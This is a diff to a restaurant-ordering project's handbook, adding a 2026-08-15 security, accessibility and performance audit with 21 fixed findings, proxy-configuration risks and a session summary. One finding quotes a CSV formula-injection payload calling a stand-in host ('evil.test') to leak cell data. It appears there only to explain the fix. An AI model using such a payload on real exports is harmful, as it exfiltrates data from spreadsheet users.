@@ -28,10 +28,13 @@ runs stays the financial system of record. We integrate with it.
 
 ```
 Current Phase:   Phase 1 — Core restaurant + customer ordering MVP
-Current Feature: Step 9 — post-redesign reconciliation
-Status:          Phase 1 complete. A design-system replacement and a chain/branch
-                 data-model change landed outside a tracked session and broke the
-                 build; that is repaired and covered by tests as of 2026-08-11.
+Current Feature: Step 9c — security / a11y / performance / UX audit (2026-08-15)
+Status:          Phase 1 complete. A full adversarial audit landed on 2026-08-15:
+                 21 findings, all fixed — see §16. The isolation, table-token,
+                 pricing, order-state and audit cores were traced end to end and
+                 held; the findings are at the edges. NOTE: the DB-backed suites
+                 could not run in the audit environment (mongod download blocked),
+                 so GitHub CI is the gate for that work — see §17.
                  One item still open from Step 8: the menu image upload interface,
                  blocked on Cloudinary credentials (see §7).
 ```
@@ -513,6 +516,7 @@ The API runs locally with no external service at all — verified 2026-08-09.
 | `IP_HASH_SALT` | Salts IP hashes in audit logs | Backend | SECRET | Pending — required in production |
 | `PUBLIC_APP_URL` | Base URL in QR/NFC payloads | Both | Public | Pending (needs domain) |
 | `CORS_ORIGIN` | Allowed frontend origin | Backend | Public | Pending |
+| `TRUST_PROXY_HOPS` | How many reverse proxies sit in front of the API in production | Backend | Public | **Defaults to `1`** (the previous hard-coded value). Production likely needs **`2`** — `vercel.json` rewrites `/api` onward to Render. Every IP rate limit depends on it; **measure `req.ips`, do not guess**. See §17 |
 | `IMAGE_PROVIDER` | Selects the image adapter (`none` \| `cloudinary`) | Backend | Public | **Set to `cloudinary`** 2026-08-12. Defaults to `none`, which silently ignores the credentials below |
 | `CLOUDINARY_CLOUD_NAME` | Appears in every image URL | Backend | Public | **Configured** |
 | `CLOUDINARY_API_KEY` | Sent to the browser in the signed upload form | Backend | Public | **Configured** |
@@ -883,6 +887,39 @@ These are deliberate. **Do not reverse them without explicit product-owner appro
 | Every table URL and QR pointed at a dead port | **High** (NFC tags unusable) | ✅ fixed | `PUBLIC_APP_URL` defaulted to `http://localhost:5173`, Vite's default port — but `apps/web/vite.config.ts` pins the dev server to **5174**. Scanning a tag gave `ERR_FAILED`. The wrong port was in four places at once: `config/env.ts` (both `PUBLIC_APP_URL` and `CORS_ORIGIN`), `scripts/dev-standalone.mts`, `.env.example`, and `.claude/launch.json`. All now 5174, each with a comment naming `vite.config.ts` as the source of truth. **No token rotation was needed** — the URL is rebuilt from `PUBLIC_APP_URL` on every read, so existing tables were correct the moment the API restarted |
 | The CORS test hardcoded a port | Low | ✅ fixed | `app.test.ts` asserted `http://localhost:5173` literally, so it failed the moment the port moved. Now reads `env.corsOrigins[0]`. A test that must be edited whenever configuration changes is testing the constant, not the behaviour |
 
+### Fixed 2026-08-15 — full security, accessibility, performance and UX audit
+
+Whole-repository adversarial review (OWASP Top 10 / ASVS / API Top 10 / WCAG 2.2 AA). The tenant
+isolation, table-token, pricing, order-state and audit designs were traced end to end and **held**;
+everything below is at the edges of those cores. `npm run test:security` could **not** be run in the
+audit environment — `fastdl.mongodb.org` is blocked by egress policy, so `mongodb-memory-server`
+cannot fetch a `mongod` binary and all 10 DB-backed suites abort at setup. CI on GitHub is unaffected
+and remains the gate. Typecheck, lint, build, the 43 shared tests and the 44 DB-free API tests were
+all run and are green.
+
+| Bug | Severity | Status | Notes |
+|---|---|---|---|
+| Platform owner password reset left every session alive | **High** | ✅ fixed | `platform.service.ts:resetOwnerPassword` wrote a new hash and stopped there. `staff.service.ts:resetStaffPassword` has always called `revokeAllSessions()`; this one never did. The reason a platform admin resets an owner's password is almost always suspected compromise — and the attacker's access token stayed valid to expiry while their refresh token stayed valid for its **full 30 days**, so the reset accomplished nothing against the case it exists for. Now revokes, and audits as `STAFF_PASSWORD_RESET` rather than a generic `PASSWORD_CHANGED` |
+| CSV formula injection in the table export | Medium | ✅ fixed | `exportTableUrls()` quoted fields for *structure* but not for *evaluation*. A table label of `=HYPERLINK("http://evil.test"&A1)` — free text any owner or manager can set — executes when a colleague opens `tables.csv` in Excel, LibreOffice or Sheets (CWE-1236). Quoting does not help: the spreadsheet strips the quotes first. Now every field goes through `csvField()`, which prefixes an apostrophe when the value starts with `= + - @ TAB CR`. 12 unit tests in `tests/csvExport.test.ts`, which need no database and so run anywhere |
+| `PATCH /platform/restaurants/:id` accepted any slug | Medium | ✅ fixed | The update route used `z.string().trim().min(1)` while creation used `slugSchema`. An edit could therefore set a slug creation would refuse — `admin`, `api`, `t`, `Has Spaces` — landing as a Mongoose `ValidationError` or a duplicate-key error, both surfacing as **500** rather than 422/409. Now `slugSchema` at the edge plus an explicit uniqueness check returning 409 |
+| Locked accounts answered faster than any other login | Low | ✅ fixed | The lockout branch returned before Argon2 ran, and Argon2 dominates the request. Every failure message is byte-identical by design, but the *timing* was not: a few milliseconds versus tens told an attacker which addresses exist and which they had already locked — the exact oracle the identical messages close. The dummy verify is now performed and discarded, matching the treatment already given to unknown emails |
+| `stripTenantFromUpdate` covered only `$set`/`$setOnInsert` | Low | ✅ fixed | Defence in depth on the tenancy invariant. `$unset: { restaurantId: 1 }` would strand a document beyond the reach of every tenant query. Not reachable today — no route passes a caller-controlled update — but this layer exists precisely so that stays true. Now cleans all eight field-naming operators |
+| The web origin served no security headers at all | Medium | ✅ fixed | `vercel.json` had rewrites and nothing else, so the SPA document shipped with no CSP, no `frame-ancestors`, no `Referrer-Policy`, no `nosniff` and no HSTS. Helmet only ever covered API responses on the Render origin. The staff, admin and platform surfaces were therefore **framable**, next to one-click destructive actions like Suspend. Added a `headers` block with a CSP scoped to what the app actually loads (self scripts, Google Fonts, `res.cloudinary.com` images, `blob:` for QR codes, `api.cloudinary.com` for direct uploads) plus HSTS, `nosniff`, `no-referrer`, `Permissions-Policy` and COOP |
+| `trust proxy` was hard-coded to one hop | Low | ✅ made configurable | `vercel.json` rewrites `/api` onward to the API host, so production has **two** proxies, not the one the code assumed. Too low a count makes every request appear to come from the last proxy, collapsing all IP rate limits into one shared bucket. Now `TRUST_PROXY_HOPS`, defaulting to the previous value of 1 so nothing changes silently. **The product owner must verify the real number** — see §17 |
+| "Export CSV" on `/admin/tables` always failed | **High** (feature was unusable) | ✅ fixed | A plain `<a href="/api/v1/app/tables/export">`. This is **exactly the bug fixed for the QR image on 2026-08-12**, in a second place: the browser issues that GET with no `Authorization` header, the staff access token lives in a module variable by design, so the route answered 401 and the browser "downloaded" an error page. Now `downloadStaffFile()` fetches through the authenticated client and saves from an object URL. `rawBlob()` also gained the same one-shot refresh `staffApi` has, so a QR or export opened more than 15 minutes after signing in no longer fails |
+| An expired session left staff on a dead screen | Medium | ✅ fixed | `RequireStaff` called `getStaffUser()` — a snapshot. `subscribeToAuth` was exported and **never used by anything**. When a refresh token finally expired mid-shift the module cleared the user but nothing re-rendered, so a cashier kept looking at a till that 401'd every action and offered no way back to sign in. Now `useStaffUser()`, a `useSyncExternalStore` subscription |
+| Kitchen and cashier actions failed silently | Medium | ✅ fixed | Both boards' mutations had `onSettled: invalidate` and no error path. A refused transition — "This order was changed by someone else", "This order is already paid" — produced **no visible change at all**, indistinguishable from a dead screen on the two surfaces where money and food are at stake. Both boards now show the server's own message with a dismiss control |
+| Destructive actions fired on a single click | Medium | ✅ fixed | Platform **Suspend** stops a real business trading within one token lifetime, and sat beside a Reset Password button that already asked for confirmation. Staff **Reset Password** and **Disable** were two small adjacent buttons, either of which ends every session that person has, with no undo — the old password is gone. All three now confirm, naming the consequence |
+| `Input`'s label was never associated with its input | Medium (a11y) | ✅ fixed | No `htmlFor`, no `id`, no wrapping `<label>` — so the label was decoration. Screen readers announced "edit text, blank", and clicking the label did nothing. Affected the kitchen note, special instructions and the whole tenant-provisioning form. Now `useId()`-paired, with `aria-invalid`/`aria-describedby` wiring the error text too |
+| The menu search box had no accessible name | Medium (a11y) | ✅ fixed | Placeholder only, which vanishes on first keystroke. Added a visually-hidden label; design unchanged |
+| Searching the menu for something absent rendered a blank page | Medium (UX) | ✅ fixed | Every category returned `null` and the only thing left on screen was the restaurant's name — it read as a crash. Now a proper empty state with a "Clear search" action, plus a polite live region announcing the result count |
+| Category headings used a hard-coded sticky offset | Low (UI) | ✅ fixed | `top-[108px]`, against the repo's own rule that sticky offsets use `--app-header-h`. The header includes `env(safe-area-inset-top)`, so on a notched phone the category bar overlapped the search field and at larger text sizes it floated below it. Now measured with a `ResizeObserver` |
+| The platform tenant card was mouse-only | Medium (a11y) | ✅ fixed | A `div` with an `onClick` was the **only** route into a tenant's detail page, so that screen was unreachable by keyboard (WCAG 2.1.1). Now a real `button` |
+| The provisioning modal was not a dialog | Medium (a11y) | ✅ fixed | No `role="dialog"`, no `aria-modal`, no accessible name, no Escape, no initial focus, no focus restoration. All added |
+| Admin tables overflowed on a phone | Low (responsive) | ✅ fixed | `Card` had `overflow-hidden` around a 4-column table with up to five action buttons, so Rotate Tag was simply unreachable on a small screen. Now `overflow-x-auto` with a `min-w`, matching what the platform audit table already did |
+| `<meta name="color-scheme" content="dark">` while shipping a light theme | Low (UI) | ✅ fixed | Native scrollbars, select and date popups, form-control defaults and the pre-paint background all rendered dark on a light page. Now `dark light`, with per-scheme `theme-color` |
+| **All of Zod shipped to every customer's phone** | Medium (performance) | ✅ fixed | The web app imported `OrderStatus`, `formatHalalas`, `Role` and `allowedNextStatuses` through the `@rw/shared` **barrel**, which re-exports `schemas/*` — and those import Zod. The result was a **72.5 kB / 19.8 kB gzipped** chunk loaded on the customer menu path to read enum constants, against a stated customer budget of 60 kB gzipped. Nothing in the browser validates with Zod; it is a server concern. Added `./enums`, `./money` and `./orderState` subpath exports and pointed the 10 web imports at them. That chunk is **gone** — replaced by three chunks totalling ~1 kB gzipped, and `grep` confirms no Zod in any bundle. **~18.8 kB gzipped off first load** |
+
 ### Open
 
 | Bug | Severity | Status | Notes |
@@ -896,6 +933,9 @@ These are deliberate. **Do not reverse them without explicit product-owner appro
 
 | Risk | Severity | Mitigation |
 |---|---|---|
+| **`TRUST_PROXY_HOPS` is a guess until measured** | **Medium** | Added 2026-08-15, defaulting to the previous hard-coded `1`. Production actually has two proxies — `vercel.json` rewrites `/api` onward to Render — so the real value is probably **2**. Too low and every request looks like it comes from the last proxy, so all IP rate limits share one bucket and a single attacker can exhaust the budget for every customer at once; too high and a forged `X-Forwarded-For` escapes the limiter entirely. **Action:** log `req.ips` once against real production traffic, count the entries, set the variable. Do not guess in either direction |
+| Rate limiting is per-process, in memory | Medium | Correct on one instance, wrong the moment there are two — each would count separately. Redis is the Phase 2 answer; until then do not scale the API horizontally |
+| The audit environment could not run the DB-backed suites | Medium | `fastdl.mongodb.org` is blocked by egress policy, so `mongodb-memory-server` cannot fetch `mongod`. The 202 security tests and 68 other DB tests were **not** executed on 2026-08-15. GitHub CI runs them on every push and remains the gate — check it is green before merging that work |
 | Tenant isolation regression as code grows | **Critical** | 4 defence layers + CI-blocking security suite |
 | Render free tier sleeps; cold start is tens of seconds | **High at pilot** | must move to a paid always-on tier before a real restaurant goes live |
 | Atlas M0 has no automated backups | **High at pilot** | paid tier before pilot **and** nightly `mongodump` to R2, with a tested restore |
@@ -1108,6 +1148,51 @@ AI recommendations · demand forecasting · ERP integrations · enterprise SSO �
 ---
 
 ## 24. Last Session Summary
+
+```
+Date:      2026-08-15
+Session:   Step 9c — full security, accessibility, performance and UX audit
+```
+
+**The cores held.** Tenant isolation (4 layers), the table-token exchange and its identical-404
+discipline, server-side pricing from the database, the order state machine's conditional
+`findOneAndUpdate`, refresh-token rotation with reuse detection, and audit-log immutability were
+each traced from untrusted input to privileged action. No path was found through any of them. All
+21 findings below are at the edges.
+
+**The two that mattered most.** `resetOwnerPassword` changed a platform-reset owner's password
+without revoking anything — so the attacker whose compromise prompted the reset kept a working
+access token and a **30-day** refresh token. It now calls `revokeAllSessions()` like its
+counterpart in `staff.service.ts` always has. And the deployed web origin served **no security
+headers at all**: `vercel.json` had rewrites and nothing else, helmet only ever covered the API
+host, so every staff and platform screen was framable next to one-click destructive actions.
+`vercel.json` now carries a CSP scoped to what the app genuinely loads, plus HSTS, nosniff,
+no-referrer, Permissions-Policy and COOP.
+
+**One bug was the same bug twice.** "Export CSV" on `/admin/tables` was a plain `<a href>` to an
+authenticated endpoint — byte for byte the mistake fixed for the QR `<img src>` on 2026-08-12,
+in a second place, with the same cause: the staff token is a module variable by design, so the
+browser has nothing to attach. Both now go through the authenticated client and an object URL.
+
+**The performance finding was the whole of Zod.** Importing `OrderStatus` and `formatHalalas`
+through the `@rw/shared` barrel dragged `schemas/*` — and therefore Zod — into a **19.8 kB
+gzipped** chunk on the customer menu path, to read enum constants, against a stated 60 kB
+customer budget. Subpath exports (`@rw/shared/enums`, `/money`, `/orderState`) removed it
+entirely: that chunk is replaced by ~1 kB gzipped and no bundle contains Zod.
+
+**Verification is partial and it matters.** `fastdl.mongodb.org` is blocked by this environment's
+egress policy, so `mongodb-memory-server` cannot fetch a `mongod` binary and **all 10 DB-backed
+suites abort at setup** — the 202 security tests did not run here. Typecheck, lint, build, the 43
+shared tests and 44 DB-free API tests are green, and 12 new `csvExport` tests plus 7 new
+`TRUST_PROXY_HOPS` tests cover the two backend fixes in a form that needs no database. **Check
+GitHub CI is green before merging.**
+
+Full finding list with severities in §16; the `TRUST_PROXY_HOPS` action for the product owner is
+in §17.
+
+---
+
+### Previous session
 
 ```
 Date:      2026-08-12
